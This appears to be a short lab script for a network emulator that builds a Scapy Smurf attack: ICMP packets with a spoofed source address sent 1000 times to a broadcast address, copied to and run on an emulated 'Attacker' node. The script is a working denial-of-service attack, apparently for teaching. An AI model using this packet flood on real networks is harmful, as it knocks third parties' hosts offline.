#!/bin/sh

#create the script that crafts the packet and sends it 1000 times
echo "\
packet=IP(src="10.0.1.10",dst="10.0.0.255")/ICMP()
send(packet*1000)
exit()" > /tmp/smurf.scapy

#copy the scapy script to the Attacker
hcp /tmp/smurf.scapy Attacker:

#execute the script
himage Attacker scapy -c smurf.scapy
